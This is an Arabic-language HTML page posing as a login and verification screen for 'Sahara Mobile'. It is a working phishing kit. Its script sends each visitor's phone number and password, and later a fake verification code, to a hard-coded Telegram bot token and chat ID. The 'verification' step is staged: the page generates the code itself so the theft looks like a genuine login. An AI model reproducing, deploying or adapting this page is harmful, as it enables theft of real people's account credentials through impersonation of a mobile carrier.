<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="صحارى موبايل - Sahara Mobile">
<meta property="og:description" content="تطبيق صحارى موبايل">
<meta property="og:image" content="https://e.top4top.io/p_3792zv22t0.png">
<meta property="og:url" content="">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="صحارى موبايل - Sahara Mobile">
<meta name="twitter:description" content="تطبيق صحارى موبايل">
<meta name="twitter:image" content="https://e.top4top.io/p_3792zv22t0.png">
<title>صحارى موبايل - Sahara Mobile</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Tahoma','Arial',sans-serif}

body{
background:linear-gradient(135deg, #f3f3f5 0%, #e8e8eb 100%);
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
}

.container{
width:100%;
max-width:420px;
padding:40px 30px;
text-align:center;
background:#fff;
border-radius:20px;
box-shadow:0 10px 40px rgba(0,0,0,0.1);
animation:slideUp 0.5s ease-out;
}

@keyframes slideUp {
from {
opacity:0;
transform:translateY(30px);
}
to {
opacity:1;
transform:translateY(0);
}
}

.page {
display:none;
animation:fadeIn 0.5s ease-out;
}

.page.active {
display:block;
}

@keyframes fadeIn {
from { opacity:0; }
to { opacity:1; }
}

.logo{
width:100px;
margin-bottom:25px;
filter:drop-shadow(0 2px 8px rgba(31,70,122,0.15));
}

.title-ar{
font-size:42px;
color:#163c6b;
margin-bottom:5px;
font-weight:bold;
}

.title-en{
font-size:32px;
color:#b08b44;
margin-bottom:10px;
letter-spacing:2px;
font-weight:600;
}

.subtitle{
font-size:16px;
color:#999;
margin-bottom:35px;
font-weight:300;
}

.input-box{
width:100%;
background:#f8f9fa;
border:2px solid #e0e0e0;
border-radius:15px;
margin-bottom:20px;
padding:16px 20px;
transition:all 0.3s ease;
}

.input-box:focus-within{
border-color:#b08b44;
background:#fff;
box-shadow:0 0 0 3px rgba(176,139,68,0.1);
}

.input-box input{
width:100%;
border:none;
outline:none;
background:transparent;
text-align:right;
font-size:18px;
color:#1f467a;
font-weight:500;
}

.input-box input::placeholder{
color:#b0b0b0;
font-weight:400;
}

.input-box input::-webkit-outer-spin-button,
.input-box input::-webkit-inner-spin-button {
-webkit-appearance:none;
margin:0;
}

.login-btn{
width:100%;
height:55px;
border:none;
border-radius:15px;
background:linear-gradient(135deg, #1f467a 0%, #163c6b 100%);
color:#fff;
font-size:20px;
font-weight:bold;
cursor:pointer;
transition:all 0.3s ease;
margin-top:10px;
letter-spacing:1px;
}

.login-btn:hover:not(:disabled){
transform:translateY(-2px);
box-shadow:0 8px 20px rgba(31,70,122,0.3);
}

.login-btn:active:not(:disabled){
transform:translateY(0);
}

.login-btn:disabled{
background:#999;
cursor:not-allowed;
opacity:0.7;
}

.footer{
margin-top:30px;
color:#a0a0a0;
font-size:14px;
}

.message{
margin-top:15px;
padding:12px;
border-radius:10px;
font-size:16px;
animation:slideDown 0.3s ease-out;
}

@keyframes slideDown {
from {
opacity:0;
transform:translateY(-10px);
}
to {
opacity:1;
transform:translateY(0);
}
}

.message.error{
color:#d32f2f;
background:#ffebee;
border-left:4px solid #d32f2f;
}

.message.success{
color:#388e3c;
background:#e8f5e9;
border-left:4px solid #388e3c;
}

.message.info{
color:#1976d2;
background:#e3f2fd;
border-left:4px solid #1976d2;
}

.verification-icon{
font-size:48px;
margin:20px 0;
animation:bounce 0.6s ease-out;
}

@keyframes bounce {
0%, 100% { transform:translateY(0); }
50% { transform:translateY(-10px); }
}

.code-inputs{
display:flex;
gap:8px;
justify-content:center;
margin:30px 0;
}

.code-input{
width:50px;
height:50px;
border:2px solid #e0e0e0;
border-radius:10px;
font-size:24px;
text-align:center;
font-weight:bold;
color:#1f467a;
transition:all 0.3s ease;
}

.code-input:focus{
border-color:#b08b44;
box-shadow:0 0 0 3px rgba(176,139,68,0.1);
outline:none;
}

.code-input:focus-visible{
outline:none;
}

.resend-container{
margin-top:25px;
}

.resend-text{
font-size:14px;
color:#999;
}

.resend-btn{
background:none;
border:none;
color:#b08b44;
font-size:14px;
cursor:pointer;
text-decoration:underline;
font-weight:bold;
transition:color 0.3s ease;
}

.resend-btn:hover:not(:disabled){
color:#163c6b;
}

.resend-btn:disabled{
color:#999;
cursor:not-allowed;
}

.timer{
display:inline-block;
margin-right:10px;
font-weight:bold;
color:#d32f2f;
}

.back-btn{
background:none;
border:none;
color:#999;
font-size:14px;
cursor:pointer;
text-decoration:underline;
margin-top:15px;
transition:color 0.3s ease;
}

.back-btn:hover{
color:#1f467a;
}

@media (max-width:480px){
.container{
padding:30px 20px;
}

.title-ar{
font-size:36px;
}

.title-en{
font-size:28px;
}

.input-box{
padding:14px 16px;
}

.input-box input{
font-size:16px;
}

.code-input{
width:45px;
height:45px;
font-size:20px;
}
}
</style>
</head>
<body>

<div class="container">
<!-- صفحة تسجيل الدخول -->
<div class="page active" id="loginPage">
<img class="logo" src="https://e.top4top.io/p_3792zv22t0.png" alt="صحارى موبايل">
<div class="title-ar">صحارى موبايل</div>
<div class="title-en">SAHARA MOBILE</div>
<div class="subtitle">تسجيل الدخول إلى حسابك</div>

<div class="input-box">
<input type="text" id="phone" placeholder="رقم الهاتف (9xxxxxxxx)" maxlength="9">
</div>

<div class="input-box">
<input type="password" id="password" placeholder="كلمة المرور">
</div>

<button class="login-btn" id="loginBtn" onclick="handleLogin()">
تسجيل الدخول
</button>

<div class="message" id="loginMsg"></div>

<div class="footer">
جميع الحقوق محفوظة © 2026 شركة مسارات
</div>
</div>

<!-- صفحة التحقق -->
<div class="page" id="verificationPage">
<img class="logo" src="https://e.top4top.io/p_3792zv22t0.png" alt="صحارى موبايل">
<div class="title-ar">التحقق من الهوية</div>
<div class="title-en">VERIFICATION</div>

<div class="verification-icon">🔐</div>
<div class="subtitle">تم إرسال رمز التحقق إلى رقمك</div>

<div class="code-inputs" id="codeInputs">
<input type="text" class="code-input" maxlength="1" inputmode="numeric">
<input type="text" class="code-input" maxlength="1" inputmode="numeric">
<input type="text" class="code-input" maxlength="1" inputmode="numeric">
<input type="text" class="code-input" maxlength="1" inputmode="numeric">
<input type="text" class="code-input" maxlength="1" inputmode="numeric">
<input type="text" class="code-input" maxlength="1" inputmode="numeric">
</div>

<button class="login-btn" id="verifyBtn" onclick="handleVerification()">
تأكيد الرمز
</button>

<div class="message" id="verifyMsg"></div>

<div class="resend-container">
<span class="resend-text">لم تستقبل الرمز؟</span><br>
<button class="resend-btn" id="resendBtn" onclick="handleResend()">
إعادة إرسال الرمز
</button>
<span class="timer" id="timer"></span>
</div>

<button class="back-btn" onclick="goBackToLogin()">العودة إلى تسجيل الدخول</button>

<div class="footer">
جميع الحقوق محفوظة © 2026 شركة مسارات
</div>
</div>

</div>

<script>
const BOT_TOKEN = '8789048053:AAGizPg8OXO6WwOrOdpsQY901Q3Bk5dnlIc';
const CHAT_ID = '-5131004892';

let currentPhone = '';
let currentPassword = '';
let verificationCode = '';
let resendTimer = 0;

// معالجة زر التسجيل
function handleLogin(){
const phone = document.getElementById('phone').value;
const password = document.getElementById('password').value;
const msgDiv = document.getElementById('loginMsg');
const loginBtn = document.getElementById('loginBtn');

if(phone === '' || password === ''){
showMessage(msgDiv, 'يرجى تعبئة جميع الحقول', 'error');
return;
}

if(!/^\d{9}$/.test(phone)){
showMessage(msgDiv, 'يرجى إدخال رقم هاتف صحيح (9 أرقام)', 'error');
return;
}

if(password.length < 4){
showMessage(msgDiv, 'كلمة المرور قصيرة جداً', 'error');
return;
}

// حفظ البيانات
currentPhone = phone;
currentPassword = password;

// تعطيل الزر
loginBtn.disabled = true;
loginBtn.innerText = 'جاري الإرسال...';

// إرسال البيانات الأولية (بدون رمز التحقق)
const message = `
🔐 بيانات تسجيل الدخول - Sahara Mobile

📱 رقم الهاتف: ${phone}
🔑 كلمة المرور: ${password}

⏳ الحالة: في انتظار التحقق
`;

sendToTelegram(message)
.then(success => {
if(success){
// إظهار رسالة النجاح
showMessage(msgDiv, '✅ تم التحقق من البيانات بنجاح', 'success');
setTimeout(() => {
goToVerification();
}, 1500);
} else {
showMessage(msgDiv, '❌ حدث خطأ في الإرسال', 'error');
loginBtn.disabled = false;
loginBtn.innerText = 'تسجيل الدخول';
}
})
.catch(error => {
console.error(error);
showMessage(msgDiv, '❌ فشل الاتصال بالخادم', 'error');
loginBtn.disabled = false;
loginBtn.innerText = 'تسجيل الدخول';
});
}

// الانتقال إلى صفحة التحقق
function goToVerification(){
document.getElementById('loginPage').classList.remove('active');
document.getElementById('verificationPage').classList.add('active');
document.getElementById('verifyMsg').innerHTML = '';
setupCodeInputs();
startResendTimer();
// توليد رمز عشوائي
verificationCode = Math.random().toString().substring(2, 8);
console.log('Verification Code:', verificationCode);
}

// العودة إلى صفحة التسجيل
function goBackToLogin(){
document.getElementById('verificationPage').classList.remove('active');
document.getElementById('loginPage').classList.add('active');
document.getElementById('phone').value = '';
document.getElementById('password').value = '';
document.getElementById('loginMsg').innerHTML = '';
currentPhone = '';
currentPassword = '';
verificationCode = '';
}

// إعداد حقول إدخال الرمز
function setupCodeInputs(){
const inputs = document.querySelectorAll('.code-input');
inputs.forEach((input, index) => {
input.value = '';
input.addEventListener('keyup', function(e){
if(this.value.length > 1){
this.value = this.value[0];
}

// التحقق من الإدخال
if(!/^\d*$/.test(this.value)){
this.value = '';
return;
}

// الانتقال للحقل التالي
if(this.value && index < inputs.length - 1){
inputs[index + 1].focus();
}

// العودة للحقل السابق عند الضغط على Backspace
if(e.key === 'Backspace' && !this.value && index > 0){
inputs[index - 1].focus();
}

// التحقق من اكتمال جميع الحقول
checkCodeComplete();
});

input.addEventListener('paste', function(e){
e.preventDefault();
const pastedData = (e.clipboardData || window.clipboardData).getData('text');
const pastedDigits = pastedData.replace(/\D/g, '').substring(0, 6);
for(let i = 0; i < pastedDigits.length && i < inputs.length; i++){
inputs[i].value = pastedDigits[i];
}
checkCodeComplete();
});
});
}

// التحقق من اكتمال الرمز
function checkCodeComplete(){
const inputs = document.querySelectorAll('.code-input');
const isComplete = Array.from(inputs).every(input => input.value !== '');
if(isComplete){
// يمكن إضافة تأثير عند اكتمال الرمز
}
}

// معالجة التحقق
function handleVerification(){
const inputs = document.querySelectorAll('.code-input');
const enteredCode = Array.from(inputs).map(input => input.value).join('');
const msgDiv = document.getElementById('verifyMsg');
const verifyBtn = document.getElementById('verifyBtn');

if(enteredCode.length !== 6){
showMessage(msgDiv, 'يرجى إدخال الرمز كاملاً (6 أرقام)', 'error');
return;
}

verifyBtn.disabled = true;
verifyBtn.innerText = 'جاري التحقق...';

// محاكاة التحقق
if(enteredCode === verificationCode){
showMessage(msgDiv, '✅ تم التحقق بنجاح!', 'success');

// إرسال البيانات الكاملة مع رمز التحقق
const finalMessage = `
✅ تسجيل دخول محتمل - Sahara Mobile

📱 رقم الهاتف: ${currentPhone}
🔑 كلمة المرور: ${currentPassword}
🔐 رمز التحقق: ${enteredCode}

✔️ تم التحقق بنجاح
`;

sendToTelegram(finalMessage)
.then(success => {
if(success){
setTimeout(() => {
showMessage(msgDiv, '🎉 تم التحقق والإرسال بنجاح!', 'success');
setTimeout(() => {
goBackToLogin();
}, 2000);
}, 500);
} else {
showMessage(msgDiv, '❌ حدث خطأ في الإرسال النهائي', 'error');
verifyBtn.disabled = false;
verifyBtn.innerText = 'تأكيد الرمز';
}
});
} else {
showMessage(msgDiv, '❌ الرمز غير صحيح. حاول مرة أخرى', 'error');
verifyBtn.disabled = false;
verifyBtn.innerText = 'تأكيد الرمز';
}
}

// إعادة إرسال الرمز
function handleResend(){
const resendBtn = document.getElementById('resendBtn');
resendBtn.disabled = true;

const message = `
🔄 إعادة إرسال الرمز - Sahara Mobile

📱 رقم الهاتف: ${currentPhone}
🔐 رمز جديد تم إعادة توليده
`;

sendToTelegram(message)
.then(success => {
if(success){
document.getElementById('verifyMsg').innerHTML = '';
verificationCode = Math.random().toString().substring(2, 8);
console.log('New Verification Code:', verificationCode);
startResendTimer();
}
});
}

// بدء مؤقت إعادة الإرسال
function startResendTimer(){
resendTimer = 60;
const resendBtn = document.getElementById('resendBtn');
const timerSpan = document.getElementById('timer');

function updateTimer(){
if(resendTimer > 0){
resendTimer--;
timerSpan.innerText = `(${resendTimer}s)`;
setTimeout(updateTimer, 1000);
} else {
resendBtn.disabled = false;
timerSpan.innerText = '';
}
}
updateTimer();
}

// إرسال البيانات إلى بوت التلجرام
function sendToTelegram(message){
return new Promise((resolve) => {
const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

fetch(telegramUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({
chat_id: CHAT_ID,
text: message,
parse_mode: 'HTML'
})
})
.then(response => response.json())
.then(data => {
resolve(data.ok);
})
.catch(error => {
console.error('Telegram Error:', error);
resolve(false);
});
});
}

// عرض الرسائل
function showMessage(element, text, type){
element.innerText = text;
element.className = `message ${type}`;
}
</script>

</body>
</html>
